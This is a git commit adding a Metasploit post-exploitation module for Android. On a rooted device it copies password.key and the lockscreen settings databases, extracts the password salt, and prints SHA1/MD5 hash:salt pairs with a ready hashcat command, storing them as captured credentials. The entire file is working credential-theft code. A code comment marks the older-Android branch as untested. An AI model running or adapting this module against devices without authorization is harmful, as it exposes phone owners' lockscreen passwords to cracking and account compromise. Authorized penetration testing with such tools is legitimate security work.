389f269dcd08cd7dddc3013cd076249bf99ed7ac
h00die <michaeltcyr@gmail.com>
2019-10-27 00:40:35 -0400

    first test of android hashdumper

---
+++ modules/post/android/gather/hashdump.rb
@@ -0,0 +1,158 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'sqlite3'
+require 'fileutils'
+
+class MetasploitModule < Msf::Post
+
+  include Msf::Post::File
+  include Msf::Post::Android::Priv
+
+  def initialize(info={})
+    super( update_info( info, {
+        'Name'          => "Android Gather Dump Password Hashes for Android Systems",
+        'Description'   => %q{
+           Post Module to dump the password hashes for Android System. Root is required.
+           To perform this operation, two things are needed.  First, a password.key file
+           is required as this contains the hash but no salt.  Next, a sqlite3 database
+           is needed (with supporting files) to pull the salt from.  Combined, this
+           creates the hash we need.  This can be cracked with Hashcat, mode 5800.
+        },
+        'License'       => MSF_LICENSE,
+        'Author'        => ['h00die'],
+        'SessionTypes'  => [ 'meterpreter', 'shell' ],
+        'Platform'      => 'android',
+        'References'    => [
+          ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
+          ['URL', 'https://hashcat.net/forum/thread-2202.html'],
+        ],
+      }
+    ))
+  end
+
+  def run
+
+    def read_store_sql(file_name, location)
+      # we need the .db file, as well as the supportinf iles .db-shm and .db-wal as they may contain
+      # the values we are looking for
+      db_loot_name = ''
+      ['', '-wal', '-shm'].each do |ext|
+        l = location + ext
+        f = file_name + ext
+        data = read_file(l)
+        if data.blank?
+          print_error("Unable to read #{l}")
+          return
+        end
+        print_good("Saved #{f} with length #{data.length}")
+
+        if ext == ''
+          loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
+          db_loot_name = loot_file
+          next
+        end
+
+        loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')
+
+        # in order for sqlite3 to see the -wal and -shm support files, we have to rename them
+        # we have to do this since the ext is > 3
+        # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391
+        new_name = "#{db_loot_name}#{ext}"
+        FileUtils.mv(loot_file, new_name)
+      end
+      SQLite3::Database.new(db_loot_name)
+    end
+
+    unless is_root?
+      print_error("This module requires root permissions.")
+      return
+    end
+
+    print_status('Attempting to determine unsalted hash')
+    unless file_exist?('/data/system/password.key')
+      print_error('No password.key file, no password on phone.')
+      return
+    end
+
+    hash = read_file('/data/system/password.key')
+    if hash.empty?
+      print_error('Unable to determine hash')
+      return
+    end
+    store_loot('Key', 'plain/text', session, hash, 'password.key', 'Android password hash key')
+    print_good('Saved password.key')
+
+    print_status('Attempting to determine salt')
+    os = cmd_exec("getprop ro.build.version.release")
+    vprint_status("OS Version: #{os}")
+    if Gem::Version.new(os) < Gem::Version.new('4.3.0')
+      # this is untested.
+      begin
+        vprint_status('Attempting to load <4.3.0 Android settings file')
+        db = read_store_sql('settings.db', '/data/data/com.android.providers.settings/databases/settings.db')
+        salt = db.execute('SELECT lockscreen.password_salt from secure;')
+      rescue SQLite3::SQLException
+        vprint_status('Failed to load old file or find salt value.  Attempting to new Android locksettings file')
+        return
+      end
+    else
+      begin
+        vprint_status('Attempting to load >=4.3.0 Android settings file')
+        db = read_store_sql('locksettings.db', '/data/system/locksettings.db')
+        if db.nil?
+          print_error('Unable to load locksettings.db file.')
+          return
+        end
+        salt = db.execute("select value from locksettings where name='lockscreen.password_salt'")
+      rescue SQLite3::SQLException
+        print_error('Unable to retrieve salt value from database.')
+        return
+      end
+    end
+
+    salt = salt[0][0] # pull string from results Command output: [["5381737017539487883"]]
+    unless salt.to_s.length == 19
+      print_error("Unable to pull salt from database.  Command output: #{salt}")
+      return
+    end
+
+    puts salt
+    # convert from number string to hex and lowercase
+    salt = salt.to_i.to_s(16)
+    print_good("Password Salt: #{salt}")
+
+    sha1 = hash[0...40]
+    print_good("SHA1: #{sha1}:#{salt}")
+    print_good("Crack with: hashcat -m 5800 #{sha1}:#{salt}")
+    credential_data = {
+        jtr_format: 'SHA1',
+        origin_type: :session,
+        post_reference_name: self.refname,
+        private_type: :nonreplayable_hash,
+        private_data: "#{sha1}:#{salt}",
+        session_id: session_db_id,
+        username: '',
+        workspace_id: myworkspace_id
+    }
+    create_credential(credential_data)
+
+    if hash.length > 40
+      md5 = hash[40...72]
+      print_good("MD5: #{md5}:#{salt}")
+      credential_data = {
+          jtr_format: 'MD5',
+          origin_type: :session,
+          post_reference_name: self.refname,
+          private_type: :nonreplayable_hash,
+          private_data: "#{md5}:#{salt}",
+          session_id: session_db_id,
+          username: '',
+          workspace_id: myworkspace_id
+      }
+      create_credential(credential_data)
+    end
+  end
+end
